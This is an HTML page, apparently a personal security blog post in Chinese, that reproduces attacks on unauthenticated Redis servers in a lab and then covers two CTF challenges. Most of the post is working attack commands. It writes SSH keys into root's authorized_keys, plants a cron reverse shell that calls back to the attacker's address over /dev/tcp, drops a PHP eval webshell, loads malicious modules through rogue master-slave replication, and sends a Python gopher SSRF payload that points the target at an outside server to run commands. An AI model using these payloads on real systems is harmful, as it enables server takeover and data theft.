@@ -1,0 +1,407 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>如何攻击Redis | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1711466907097">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="如何攻击Redis | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="测试环境
+攻击机：kali 10.211.55.12
+Redis：ubuntu 10.211.55.18
+攻击手法
+未授权登录
+修改配置文件
+bind 0.0.0.0		# 允许远程登录
+config set protected-mode ..." />
+    <meta name="keywords" content="SSRF,Redis,漏洞复现" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1711466907097" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    sky, blue and ...
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://skyblu3519.github.io/post/you-lian" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              如何攻击Redis
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-10-26
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/wOJluW2rm/" class="post-tag">
+                  # SSRF
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/TYxLMWbotH/" class="post-tag">
+                  # Redis
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/fKwN_Yn3T/" class="post-tag">
+                  # 漏洞复现
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/ru-he-gong-ji-redis.PNG" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="测试环境">测试环境</h1>
+<p>攻击机：kali 10.211.55.12<br>
+Redis：ubuntu 10.211.55.18</p>
+<h1 id="攻击手法">攻击手法</h1>
+<h2 id="未授权登录">未授权登录</h2>
+<p>修改配置文件</p>
+<pre><code>bind 0.0.0.0		# 允许远程登录
+config set protected-mode no		# 关闭安全模式
+# requirepass your_password			注释掉这一行，禁用密码认证，不过配置文件中默认是没有这一行的
+</code></pre>
+<p>ubuntu上用<code>redis-server /etc/redis.conf</code>启动Redis服务指定配置文件。</p>
+<p>kali上可以直接连接到这个Redis，执行<code>redis-cli -h 10.211.55.18</code>。</p>
+<h2 id="写文件">写文件</h2>
+<p>写文件执行的命令为</p>
+<pre><code>config set dir /tmp/  	# 设置保存目录
+config set dbfilename evil.rdb     # 设置保存文件名
+set key &quot;value&quot;		# 输入数据
+save 		# 执行备份
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1698255103914.png" alt="" loading="lazy"></figure>
+<p>文件中内容如下<br>
+<img src="https://skyblu3519.github.io/post-images/1698255112857.png" alt="" loading="lazy"></p>
+<p>基于这个特性我们就可以来写ssh公钥，webshell，计划任务反弹shell</p>
+<h3 id="ssh公钥登录">SSH公钥登录</h3>
+<p>下载开启ssh服务</p>
+<pre><code>apt install openssh-server
+systemctl start ssh
+</code></pre>
+<p>编辑ssh配置文件<code>/etc/ssh/sshd_config</code></p>
+<pre><code>PubkeyAuthentication yes			# 启用公钥认证
+PasswordAuthentication no			# 禁用密码认证
+</code></pre>
+<p>重启ssh服务<code>systemctl restart ssh</code></p>
+<p>在kali上生成密钥对<code>ssh-keygen -t rsa</code><br>
+<img src="https://skyblu3519.github.io/post-images/1698255129811.png" alt="" loading="lazy"></p>
+<p>保存公钥文件<code>(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; kali </code></p>
+<p>在Redis添加公钥记录，同时保存到<code>/root/.ssh/authorized_keys</code></p>
+<pre><code class="language-shell">cat kali | redis-cli -h 10.211.55.18 -x set kali 
+
+redis-cli -h 10.211.55.18
+10.211.55.18:6379&gt; config set dir /root/.ssh/
+OK
+10.211.55.18:6379&gt; config set dbfilename authorized_keys
+OK
+10.211.55.18:6379&gt; save
+</code></pre>
+<p><code>/root/.ssh/authorized_keys</code>内容为，这是可以被识别出来的<br>
+<img src="https://skyblu3519.github.io/post-images/1698255165760.png" alt="" loading="lazy"></p>
+<p>免密登录<code>ssh -i /root/.ssh/id_rsa root@10.211.55.18 </code><br>
+<img src="https://skyblu3519.github.io/post-images/1698255175683.png" alt="" loading="lazy"></p>
+<h3 id="写计划任务">写计划任务</h3>
+<h4 id="快速入门">快速入门</h4>
+<p>Linux的计划任务通常是通过<code>cron</code>服务来实现的。<code>cron</code>是一个守护进程，可以定期执行用户预定的任务。用户可以通过<code>crontab</code>命令来管理自己的计划任务。</p>
+<p><strong>如何写计划任务：</strong></p>
+<ol>
+<li>**编辑Cron任务：**输入<code>crontab -e</code>命令，这会打开一个文本编辑器，允许你编辑你的计划任务。</li>
+<li>**添加任务：**在编辑器中，你可以添加新的任务。任务的格式如下：</li>
+</ol>
+<pre><code class="language-javascript">* * * * * /path/to/command arg1 arg2
+</code></pre>
+<p>字段的意义：</p>
+<ul>
+<li>第1个 *：分钟（0-59）</li>
+<li>第2个 *：小时（0-23）</li>
+<li>第3个 *：一个月中的第几天（1-31）</li>
+<li>第4个 *：月份（1-12）</li>
+<li>第5个 *：一周中的第几天（0-7，0和7都代表星期日）</li>
+<li><strong>/path/to/command arg1 arg2</strong>：要运行的命令及其参数</li>
+</ul>
+<p>示例：每天的5:30运行 <strong>/path/to/script.sh</strong></p>
+<pre><code>30 5 * * * /path/to/script.sh
+</code></pre>
+<p><strong>如何取消计划任务：</strong></p>
+<ol>
+<li>**列出当前的Cron任务：**输入 <code>**crontab -l**</code> 命令，这会列出你当前的所有计划任务。</li>
+<li><strong>删除特定任务</strong>
+<ul>
+<li>输入 <code>**crontab -e**</code> 命令，打开编辑器。</li>
+<li>在编辑器中，找到并删除你想取消的任务的相应行。</li>
+</ul>
+</li>
+<li>**删除所有任务：**如果你想删除所有任务，可以使用 <code>**crontab -r**</code> 命令。</li>
+</ol>
+<p><strong>/var/spool/cron/目录</strong></p>
+<ul>
+<li><strong>/var/spool/cron/</strong> 是 Linux 系统中一个特殊的目录，用于存储用户的 <strong>crontab</strong> 文件。</li>
+<li>当用户使用 <strong>crontab -e</strong> 命令编辑自己的 cron 任务时，这些任务被保存在 <strong>/var/spool/cron/</strong> 目录下。</li>
+<li>每个用户有一个与其用户名同名的文件。</li>
+<li><strong>cron</strong> 守护进程会定期读取 <strong>/var/spool/cron/</strong> 目录中的文件，根据其中定义的计划执行相应的任务。</li>
+</ul>
+<h4 id="通过计划任务反弹shell">通过计划任务反弹shell</h4>
+<blockquote>
+<p>这个方法只能在Centos上使用，Ubuntu上是行不通的，原因如下:</p>
+<p>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是<code>600</code>也就是<code>-rw-------</code>才会执行。否则会报错(root) INSECURE MODE (mode 0600 expected)。而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行<br>
+<img src="https://skyblu3519.github.io/post-images/1698255198557.png" alt="" loading="lazy"></p>
+<p>同时，redis保存RDB会存在乱码。这在Ubuntu上会报错，而在Centos上不会报错。</p>
+<p>另外，由于系统的不同，crontrab定时文件位置也会不同</p>
+<ul>
+<li>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code></li>
+<li>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code></li>
+</ul>
+</blockquote>
+<pre><code class="language-shell"># * * * * * 表示每分钟、每小时、每天、每月、每周的每天都会执行
+set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/10.211.55.12/9999 0&gt;&amp;1\n&quot;
+config set dir /var/spool/cron/
+config set dbfilename root
+save
+</code></pre>
+<p><code>/var/spool/cron/root</code>文件内容<br>
+<img src="https://skyblu3519.github.io/post-images/1698255225041.png" alt="" loading="lazy"></p>
+<h3 id="写webshell">写WebShell</h3>
+<p>网站的绝对路径已知</p>
+<pre><code class="language-shell">config set dir /var/www/html/
+config set dbfilename shell.php
+set x &quot;&lt;?php @eval($_POST['test']);?&gt;&quot;
+save
+</code></pre>
+<h2 id="主从复制">主从复制</h2>
+<p>主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写。</p>
+<p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。<br>
+<img src="https://skyblu3519.github.io/post-images/1698255247615.png" alt="" loading="lazy"></p>
+<p>大致原理上就是Redis加载了一个恶意模块，让Redis命令行可以执行系统命令。克隆<a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">RedisModules-ExecuteCommand</a>到本地，进入src目录执行make，会提示一些警告但不影响。<br>
+<img src="https://skyblu3519.github.io/post-images/1698255256181.png" alt="" loading="lazy"></p>
+<p>执行完成后，在目录下出现的<code>module.so</code>就是我们让目标加载的恶意模块。在redis命令行中使用<code>MODULE LOAD PATH</code>加载<br>
+<img src="https://skyblu3519.github.io/post-images/1698255276426.png" alt="" loading="lazy"></p>
+<p>也可以启动reids时用<code>--loadmodule</code>指定加载的模块<br>
+<img src="https://skyblu3519.github.io/post-images/1698255285851.png" alt="" loading="lazy"></p>
+<p>知道大致原理后，了解下这个脚本的用法<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a>。克隆之后将目录下的<code>exp.so</code>替换为我们之前编译出来的<code>module.so</code>（注意名称使用<code>exp.so</code>），指定本机IP和目标IP运行，然后就可以执行命令了</p>
+<pre><code class="language-shell">python3 redis-rogue-server.py --lhost 10.211.55.12 --rhost 10.211.55.18
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/1698255317628.png" alt="" loading="lazy"></figure>
+<p>上面是目标和攻击机可以互相访问的情况，还有一种Redis在内网无法被直接访问的情况。之前柏鹭杯找了一个脚本<a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a>，这里有一个被动连接模式就可以做。<br>
+<img src="https://skyblu3519.github.io/post-images/1698255326102.png" alt="" loading="lazy"></p>
+<p>下载这个脚本，同样将里面的<code>exp.so</code>替换掉。然后用<code>python3 redis-rogue-server.py --server-only</code>启动，脚本会监听<code>21000</code>端口<br>
+<img src="https://skyblu3519.github.io/post-images/1698255335899.png" alt="" loading="lazy"></p>
+<p>当在目标机器上执行<code>slaveof</code>命令后，slave会将这些数据保存到设置的<code>dbfilename</code>文件中（默认是<code>./dump.db</code>）。</p>
+<pre><code class="language-shell">10.211.55.18:6379&gt; config set dir /tmp
+OK
+10.211.55.18:6379&gt; config set dbfilename evil.rdb
+OK
+10.211.55.18:6379&gt; slaveof 10.211.55.12 21000
+OK
+</code></pre>
+<p>数据传入成功<br>
+<img src="https://skyblu3519.github.io/post-images/1698255364564.png" alt="" loading="lazy"></p>
+<p>目标服务器上已经同步好文件了<br>
+<img src="https://skyblu3519.github.io/post-images/1698255373488.png" alt="" loading="lazy"></p>
+<p>使用<code>module load /tmp/evil.rdb</code>加载，然后就可以执行命令了<br>
+<img src="https://skyblu3519.github.io/post-images/1698255382437.png" alt="" loading="lazy"></p>
+<h1 id="ctf">CTF</h1>
+<h2 id="2023柏鹭杯综合7">[2023柏鹭杯]综合7</h2>
+<p>没有环境就简单复盘下。参考<a href="http://blog.xmcve.com/2023/10/13/%E6%9F%8F%E9%B9%AD%E6%9D%AF2023-Writeup/#title-4">星盟的WP</a></p>
+<p>其实拿到Redis信息之后就是一个简单的Redis利用，虽然Java机上没有redis-cli，但是可以上传个frpc去做内网穿透，然后就可以在kali上攻击Redis了。</p>
+<p>Anyway，写计划任务、公钥、主从复制都行，不过没有想到frpc确实是渗透经验太少了😢</p>
+<h2 id="网鼎杯-2020-玄武组ssrfme">[网鼎杯 2020 玄武组]SSRFMe</h2>
+<p>用<code>0.0.0.0</code>绕过<br>
+<img src="https://skyblu3519.github.io/post-images/1698255412679.png" alt="" loading="lazy"></p>
+<p>传参<code>?url=http://0.0.0.0/hint.php</code></p>
+<pre><code class="language-php">// hint.php
+&lt;?php
+if($_SERVER['REMOTE_ADDR']===&quot;127.0.0.1&quot;){
+  highlight_file(__FILE__);
+}
+if(isset($_POST['file'])){
+  file_put_contents($_POST['file'],&quot;&lt;?php echo 'redispass is root';exit();&quot;.$_POST['file']);
+}
+</code></pre>
+<p>提示redis，使用gopher让目标执行主从复制</p>
+<pre><code class="language-php">from urllib.parse import quote
+import requests
+# tcp_payload = &quot;auth root\r\nconfig get dir\r\nquit\r\n&quot;
+tcp_payload = &quot;auth root\r\nconfig set dir /tmp\r\nconfig set dbfilename evil.rdb\r\nSLAVEOF 47.115.227.70 2100\r\nMODULE LOAD /tmp/evil.rdb\r\nsystem.exec 'nl /*'\r\nquit\r\n&quot;
+print(tcp_payload)
+inner_url = f&quot;gopher://0.0.0.0:6379/_{quote(quote(tcp_payload))}&quot;
+# print(inner_url)
+url = &quot;http://5a210ce2-e8d9-49c2-a823-f715204a1cce.node4.buuoj.cn:81/?url=&quot; + inner_url
+resp = requests.get(url)
+print(resp.text)
+</code></pre>
+<p>这里似乎是我VPS的问题，无法给从机传数据<br>
+<img src="https://skyblu3519.github.io/post-images/1698255431266.png" alt="" loading="lazy"></p>
+<p>先这样吧....</p>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://xz.aliyun.com/t/12362">https://xz.aliyun.com/t/12362</a><br>
+<a href="https://www.cnblogs.com/loongten/p/15838580.html">https://www.cnblogs.com/loongten/p/15838580.html</a><br>
+<a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a><br>
+<a href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a><br>
+<a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83">测试环境</a></li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95">攻击手法</a>
+<ul>
+<li><a href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95">未授权登录</a></li>
+<li><a href="#%E5%86%99%E6%96%87%E4%BB%B6">写文件</a>
+<ul>
+<li><a href="#ssh%E5%85%AC%E9%92%A5%E7%99%BB%E5%BD%95">SSH公钥登录</a></li>
+<li><a href="#%E5%86%99%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">写计划任务</a>
+<ul>
+<li><a href="#%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8">快速入门</a></li>
+<li><a href="#%E9%80%9A%E8%BF%87%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell">通过计划任务反弹shell</a></li>
+</ul>
+</li>
+<li><a href="#%E5%86%99webshell">写WebShell</a></li>
+</ul>
+</li>
+<li><a href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6">主从复制</a></li>
+</ul>
+</li>
+<li><a href="#ctf">CTF</a>
+<ul>
+<li><a href="#2023%E6%9F%8F%E9%B9%AD%E6%9D%AF%E7%BB%BC%E5%90%887">[2023柏鹭杯]综合7</a></li>
+<li><a href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme">[网鼎杯 2020 玄武组]SSRFMe</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/tomcat-sessioncve-2020-9484fan-xu-lie-hua-lou-dong-fu-xian/">
+              <h3 class="post-title">
+                Tomcat Session（CVE-2020-9484）反序列化漏洞复现
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
